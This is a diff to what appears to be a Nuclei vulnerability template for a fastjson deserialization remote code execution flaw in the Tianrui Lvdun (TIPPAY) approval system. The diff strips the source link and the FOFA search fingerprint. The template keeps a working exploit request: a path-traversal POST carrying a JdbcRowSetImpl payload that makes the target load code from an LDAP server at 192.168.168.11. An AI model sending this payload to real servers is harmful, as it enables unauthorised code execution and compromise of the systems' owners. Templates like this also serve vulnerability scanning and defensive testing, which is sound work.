@@ -3,12 +3,8 @@ info:
   name: 天锐绿盾审批系统list fastjson反序列化漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iabu3s8gughzz0eg'
+  description: ''
   tags: rce,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: iabu3s8gughzz0eg
-    fofa: app="TIPPAY-绿盾审批系统"
 http:
 - raw:
   - "POST /trwfe/login.jsp/.%2e/rest/ext/app/fileopen/record HTTP/1.1\nHost: {{Hostname}}\nX-Authorization: dir\nContent-Type: application/json\n\n[\n  {\n    \"@type\": \"com.sun.rowset.JdbcRowSetImpl\",\n    \"dataSourceName\": \"ldap://192.168.168.11:50389/165c51\",\n    \"autoCommit\": true\n  }\n]"
